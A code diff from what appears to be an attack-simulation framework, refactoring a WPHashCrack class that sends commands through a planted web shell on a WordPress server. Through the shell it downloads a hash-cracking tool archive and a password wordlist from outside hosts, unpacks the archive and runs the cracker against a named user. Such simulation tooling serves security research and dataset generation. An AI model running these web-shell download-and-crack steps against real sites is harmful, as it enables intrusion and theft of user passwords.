@@ -26,6 +26,7 @@ from bs4 import BeautifulSoup
 from pwnlib.tubes.listen import listen
 from structlog.stdlib import BoundLogger
 
+from cr_kyoushi.simulation.model import ApproximateFloat
 from cr_kyoushi.simulation.util import (
     sleep,
     sleep_until,
@@ -516,23 +517,32 @@ class WPHashCrack:
     def __init__(
         self,
         hashcrack_url: str,
+        file_name: str,
         wl_host: str,
         attacked_user: str,
-        tar_name: str = None,
+        tar_download_name: str = None,
         cmd_param: str = "wp_meta",
         verify: bool = False,
         timeout: Optional[float] = None,
-        sleep_time: float = 3.0,
+        sleep_time: Union[ApproximateFloat, float] = 3.0,
     ):
         """
         Args:
+            hashcrack_url: url of the hashcrack tar.
+            file_name: name of the hashcrack tar.
             wl_host: address of the host where wordlist is available.
             attacked_user: the name of the WP user to crack the password.
+            tar_download_name: the name of the hashcrack tar after downloading.
+            cmd_param: the GET parameter to embed the command in.
+            verify: if HTTPS connection should very TLS certs.
+            timeout: the maximum time to wait for the web server to respond.
+            sleep_time: the waiting time between executed requests.
         """
         self.url = hashcrack_url
+        self.file_name = file_name
         self.wl_host = wl_host
         self.attacked_user = attacked_user
-        self.tar_name = tar_name
+        self.tar_download_name = tar_download_name
         self.cmd_param = cmd_param
         self.verify = verify
         self.timeout = timeout
@@ -553,57 +563,48 @@ class WPHashCrack:
             web_shell=web_shell,
         )
         if web_shell is not None:
-            log.info("Running WPHashCrack")
-            if self.tar_name is None:
-                output = send_request(
-                    log,
-                    web_shell,
-                    ["wget", self.url],
-                    self.cmd_param,
-                    self.verify,
-                    self.timeout,
-                )
-            else:
-                output = send_request(
-                    log,
-                    web_shell,
-                    ["wget", "-O", self.tar_name, self.url],
-                    self.cmd_param,
-                    self.verify,
-                    self.timeout,
-                )
-            sleep(self.sleep_time)
-            log.info("Web shell command response", output=output)
-            if self.tar_name is None:
-                output = send_request(
-                    log,
-                    web_shell,
-                    ["tar", "xvfz", "v0.1.tar.gz"],
-                    self.cmd_param,
-                    self.verify,
-                    self.timeout,
-                )
-            else:
-                output = send_request(
-                    log,
-                    web_shell,
-                    ["tar", "xvfz", self.tar_name],
-                    self.cmd_param,
-                    self.verify,
-                    self.timeout,
-                )
-            sleep(self.sleep_time)
-            log.info("Web shell command response", output=output)
+            log.info("Downloading WPHashCrack")
+            archive_download_cmd = ["wget", self.url + self.file_name]
+            if self.tar_download_name is not None:
+                archive_download_cmd += ["-O", self.tar_download_name]
             output = send_request(
                 log,
                 web_shell,
-                ["wget", "http://" + self.wl_host + "/rockyou.txt"],
+                archive_download_cmd,
                 self.cmd_param,
                 self.verify,
                 self.timeout,
             )
             sleep(self.sleep_time)
             log.info("Web shell command response", output=output)
+            log.info("Downloaded WPHashCrack")
+            log.info("Unarchiving WPHashCrack")
+            if self.tar_download_name is None:
+                self.tar_download_name = self.file_name
+            output = send_request(
+                log,
+                web_shell,
+                ["tar", "xvfz", self.tar_download_name],
+                self.cmd_param,
+                self.verify,
+                self.timeout,
+            )
+            sleep(self.sleep_time)
+            log.info("Web shell command response", output=output)
+            log.info("Unarchived WPHashCrack")
+            log.info("Downloading password list")
+            output = send_request(
+                log,
+                web_shell,
+                ["wget", self.wl_host],
+                self.cmd_param,
+                self.verify,
+                self.timeout,
+            )
+            sleep(self.sleep_time)
+            log.info("Web shell command response", output=output)
+            log.info("Downloaded password list")
+            log.info("Running WPHashCrack")
             output = send_request(
                 log,
                 web_shell,
